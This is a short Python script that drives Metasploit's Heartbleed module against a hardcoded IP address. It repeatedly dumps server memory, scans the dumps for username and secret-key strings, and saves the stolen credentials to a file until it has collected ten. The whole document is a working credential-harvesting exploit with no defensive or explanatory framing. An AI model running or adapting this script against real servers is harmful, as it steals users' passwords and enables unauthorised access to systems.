#!/usr/bin/python

import time
import os
from subprocess import call

loot = "/root/.msf4/loot/"
store = "/client/heartbleeds.txt"
haul = {}

count = 0
max = 10

while (count <= max):
    found = 0
    print "Triggering Heartbleed..."
    call(['msfconsole', '-q', '-x use auxiliary/scanner/ssl/openssl_heartbleed; set ACTION DUMP; set RHOSTS 209.203.99.78; exploit; exit'])
    print "Checking results..."
    call('strings '+loot+"* > /tmp/bleed.txt", shell=True)
    call('rm '+loot+"*", shell=True)
    file = open('/tmp/bleed.txt', 'r')
    print "Parsing file..."
    for line in file.readlines():
        if ("username=" in line):
            sdex = line.find("username=")
            edex = line.find("sessagingVersion")
            trimd = line[sdex:]
            user = trimd[trimd.find('=')+1:trimd.find('&')]
            passw = trimd[trimd.find('secretkey=')+10:]
            if (user in haul):
                if (haul[user] == passw): pass
                else:
                    haul[user]=passw
                    print "\tCreds found!"
                    found = 1
            else:
                haul[user]=passw
                print "\tNew Cred found!"
                found = 1

            if (found == 1):
                out = open(store, 'a')
                out.write(user+" : "+passw+"\n")
                out.close()
                count += 1
            break
    file.close()
    if (found == 0): print "No creds found"
    print "Sleeping 1 minute..."
    print ""
    call(['rm', '/tmp/bleed.txt'])
    time.sleep(59)
